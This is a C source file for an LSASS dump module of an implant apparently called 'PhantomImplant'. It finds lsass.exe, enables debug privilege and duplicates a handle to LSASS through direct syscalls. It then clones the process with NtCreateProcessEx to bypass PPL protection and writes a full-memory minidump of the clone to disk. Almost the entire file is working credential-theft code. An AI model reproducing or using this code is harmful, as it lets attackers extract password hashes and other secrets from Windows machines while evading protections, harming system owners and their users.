/**
 * PhantomImplant - LSASS Dump Module
 *
 * PPL bypass via handle duplication + process forking (NtCreateProcessEx),
 * then MiniDumpWriteDump into an in-memory buffer written to disk.
 *
 * Reference flow:
 *   1. Find lsass.exe PID
 *   2. Enumerate system handles, duplicate one pointing to LSASS and elevate
 *      it to PROCESS_QUERY_INFORMATION | PROCESS_CREATE_PROCESS
 *   3. Fork (clone) LSASS with NtCreateProcessEx
 *   4. MiniDumpWriteDump the clone via a callback, write bytes to disk
 */

#include "lsass.h"
#include "syscalls.h"
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>

extern NTAPI_FUNC g_Nt;

#define SystemExtendedHandleInformation  64
#define ObjectTypeInformation            2
#define INITIAL_BUFFER_SIZE              (1024ULL * 1024ULL * 64ULL)   // 64 MB

// ------------------------------------------------------------------
// Structures not exposed by mingw's winternl.h
// ------------------------------------------------------------------
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID       Object;
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   HandleValue;
    ULONG       GrantedAccess;
    USHORT      CreatorBackTraceIndex;
    USHORT      ObjectTypeIndex;
    ULONG       HandleAttributes;
    ULONG       Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR   NumberOfHandles;
    ULONG_PTR   Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

// PUBLIC_OBJECT_TYPE_INFORMATION is provided by winternl.h (common.h).
// MiniDump* types are provided by <dbghelp.h> (psdk_inc/_dbg_common.h),
// except the Io callback struct, which older mingw headers omit — define
// it locally and cast into MINIDUMP_CALLBACK_INPUT's anonymous union.

typedef struct _LSASS_MINIDUMP_IO_CALLBACK {
    HANDLE  Handle;
    ULONG64 Offset;
    PVOID   Buffer;
    ULONG   BufferBytes;
} LSASS_MINIDUMP_IO_CALLBACK, *PLSASS_MINIDUMP_IO_CALLBACK;

typedef struct _MINIDUMP_CALLBACK_PARM {
    LPVOID     pDumpedBuffer;
    DWORDLONG  dwDumpedBufferSize;
    DWORDLONG  dwAllocatedBufferSize;
} MINIDUMP_CALLBACK_PARM, *PMINIDUMP_CALLBACK_PARM;

// ------------------------------------------------------------------
BOOL FindLsassPid(OUT DWORD* pdwPid) {
    PROCESSENTRY32W pe    = { .dwSize = sizeof(PROCESSENTRY32W) };
    HANDLE           hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    BOOL             found = FALSE;

    *pdwPid = 0;
    if (hSnap == INVALID_HANDLE_VALUE)
        return FALSE;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, L"lsass.exe") == 0) {
                *pdwPid = pe.th32ProcessID;
                found   = TRUE;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return found;
}

// ------------------------------------------------------------------
static BOOL SetDebugPrivilege(VOID) {
    HANDLE           hToken = NULL;
    TOKEN_PRIVILEGES tp     = {0};
    LUID             luid   = {0};

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

// ------------------------------------------------------------------
// Enumerate system handles, find one that is a Process handle pointing
// at LSASS, duplicate it with elevated rights.
// ------------------------------------------------------------------
static BOOL DuplicateLsassHandle(OUT HANDLE* phLsassProcess, IN DWORD dwLsassPid) {
    NTSTATUS                         st      = 0;
    ULONG                            bufSize = 0x40000;   // 256 KB initial
    PSYSTEM_HANDLE_INFORMATION_EX    pInfo   = NULL;
    BOOL                             found   = FALSE;

    *phLsassProcess = NULL;

    do {
        if (pInfo)
            HeapFree(GetProcessHeap(), 0, pInfo);
        pInfo = (PSYSTEM_HANDLE_INFORMATION_EX)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
        if (!pInfo)
            return FALSE;

        SET_SYSCALL(g_Nt.NtQuerySystemInformation);
        st = RunSyscall(SystemExtendedHandleInformation, pInfo, bufSize, NULL);
        if (st == 0xC0000004)   // STATUS_INFO_LENGTH_MISMATCH
            bufSize *= 2;
    } while (st == 0xC0000004);

    if (st != 0)
        goto _done;

    for (ULONG_PTR i = 0; i < pInfo->NumberOfHandles; i++) {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX e = &pInfo->Handles[i];
        HANDLE hTmp  = NULL;
        HANDLE hDup  = NULL;
        ULONG  retLen = 0;

        if ((DWORD)e->UniqueProcessId == dwLsassPid)
            continue;

        if (!(hTmp = OpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)e->UniqueProcessId)))
            continue;

        if (!DuplicateHandle(hTmp, (HANDLE)e->HandleValue, GetCurrentProcess(), &hDup,
                             PROCESS_QUERY_INFORMATION | PROCESS_CREATE_PROCESS, FALSE, 0)) {
            CloseHandle(hTmp);
            continue;
        }
        CloseHandle(hTmp);

        // Query required size for object type info
        SET_SYSCALL(g_Nt.NtQueryObject);
        RunSyscall(hDup, ObjectTypeInformation, NULL, 0, &retLen);
        if (!retLen) {
            CloseHandle(hDup);
            continue;
        }

        PPUBLIC_OBJECT_TYPE_INFORMATION pType =
            (PPUBLIC_OBJECT_TYPE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, retLen);
        if (!pType) {
            CloseHandle(hDup);
            continue;
        }

        SET_SYSCALL(g_Nt.NtQueryObject);
        st = RunSyscall(hDup, ObjectTypeInformation, pType, retLen, &retLen);
        if (st != 0) {
            HeapFree(GetProcessHeap(), 0, pType);
            CloseHandle(hDup);
            continue;
        }

        if (wcscmp(pType->TypeName.Buffer, L"Process") != 0) {
            HeapFree(GetProcessHeap(), 0, pType);
            CloseHandle(hDup);
            continue;
        }

        if (GetProcessId(hDup) != dwLsassPid) {
            HeapFree(GetProcessHeap(), 0, pType);
            CloseHandle(hDup);
            continue;
        }

        HeapFree(GetProcessHeap(), 0, pType);
        *phLsassProcess = hDup;
        found = TRUE;
        break;
    }

_done:
    if (pInfo)
        HeapFree(GetProcessHeap(), 0, pInfo);
    return found;
}

// ------------------------------------------------------------------
// Fork (clone) the process via NtCreateProcessEx. The duplicated handle
// becomes the parent; the output handle overwrites it with the clone.
// ------------------------------------------------------------------
static BOOL ForkRemoteProcess(IN OUT HANDLE* phLsassHandle) {
    HANDLE hOld = *phLsassHandle;
    NTSTATUS st;

    SET_SYSCALL(g_Nt.NtCreateProcessEx);
    st = RunSyscall(
        phLsassHandle,
        (ACCESS_MASK)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ),
        NULL,
        hOld,
        (ULONG)0,           // Flags
        NULL,               // SectionHandle
        NULL,               // DebugPort
        NULL,               // TokenHandle
        (ULONG)0            // Reserved
    );

    if (st == 0)
        CloseHandle(hOld);   // original duplicated handle no longer needed
    return (st == 0);
}

// ------------------------------------------------------------------
// MiniDumpWriteDump callback: redirect dump output into a heap buffer.
// ------------------------------------------------------------------
static BOOL WINAPI MinidumpCallbackRoutine(PVOID CallbackParam, PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
    PMINIDUMP_CALLBACK_PARM pParm = (PMINIDUMP_CALLBACK_PARM)CallbackParam;

    switch (CallbackInput->CallbackType) {
    case IoStartCallback:
        CallbackOutput->Status = S_FALSE;
        break;

    case IoWriteAllCallback: {
        const LSASS_MINIDUMP_IO_CALLBACK* pIo = (const LSASS_MINIDUMP_IO_CALLBACK*)&CallbackInput->Thread;
        DWORDLONG dwOffset      = pIo->Offset;
        DWORDLONG dwBufferBytes = pIo->BufferBytes;
        DWORDLONG dwRequired    = dwOffset + dwBufferBytes;

        if (dwRequired > pParm->dwAllocatedBufferSize) {
            DWORDLONG dwNewSize = (dwRequired > pParm->dwAllocatedBufferSize * 2)
                                    ? dwRequired : pParm->dwAllocatedBufferSize * 2;
            LPVOID pNew = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pParm->pDumpedBuffer, (SIZE_T)dwNewSize);
            if (!pNew) {
                CallbackOutput->Status = E_OUTOFMEMORY;
                return FALSE;
            }
            pParm->pDumpedBuffer       = pNew;
            pParm->dwAllocatedBufferSize = dwNewSize;
        }

        LPVOID pDest = (LPVOID)((ULONG_PTR)pParm->pDumpedBuffer + dwOffset);
        memcpy(pDest, pIo->Buffer, (SIZE_T)dwBufferBytes);
        if (dwRequired > pParm->dwDumpedBufferSize)
            pParm->dwDumpedBufferSize = dwRequired;
        CallbackOutput->Status = S_OK;
        break;
    }

    case IoFinishCallback:
        CallbackOutput->Status = S_OK;
        break;

    default:
        return TRUE;
    }

    return TRUE;
}

// ------------------------------------------------------------------
BOOL DumpLsassViaMiniDump(IN DWORD dwLsassProcessId, IN PCHAR cDumpFileName) {
    HANDLE                       hLsass = NULL;
    HANDLE                       hFile  = INVALID_HANDLE_VALUE;
    MINIDUMP_CALLBACK_INFORMATION mci   = {0};
    MINIDUMP_CALLBACK_PARM       parm   = {0};
    DWORD                        written = 0;
    BOOL                         ok      = FALSE;

    if (!cDumpFileName || !cDumpFileName[0])
        return FALSE;

    if (!SetDebugPrivilege())
        return FALSE;

    if (!DuplicateLsassHandle(&hLsass, dwLsassProcessId))
        return FALSE;

    if (!ForkRemoteProcess(&hLsass))
        goto _done;

    parm.dwAllocatedBufferSize = INITIAL_BUFFER_SIZE;
    parm.pDumpedBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)INITIAL_BUFFER_SIZE);
    if (!parm.pDumpedBuffer)
        goto _done;

    mci.CallbackRoutine = MinidumpCallbackRoutine;
    mci.CallbackParam   = &parm;

    if (!MiniDumpWriteDump(hLsass, 0, 0, MiniDumpWithFullMemory, NULL, NULL, &mci))
        goto _done;

    hFile = CreateFileA(cDumpFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        goto _done;

    if (!WriteFile(hFile, parm.pDumpedBuffer, (DWORD)parm.dwDumpedBufferSize, &written, NULL) ||
        written != (DWORD)parm.dwDumpedBufferSize)
        goto _done;

    ok = TRUE;

_done:
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    if (parm.pDumpedBuffer)
        HeapFree(GetProcessHeap(), 0, parm.pDumpedBuffer);
    if (hLsass)
        CloseHandle(hLsass);
    return ok;
}
